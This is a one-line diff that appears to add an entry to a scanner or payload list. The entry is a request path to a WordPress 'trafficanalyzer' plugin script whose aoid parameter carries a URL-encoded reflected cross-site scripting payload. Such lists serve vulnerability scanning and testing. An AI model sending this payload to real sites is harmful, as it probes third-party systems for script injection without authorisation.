@@ -1,0 +1,1 @@
+/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php?aoid=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
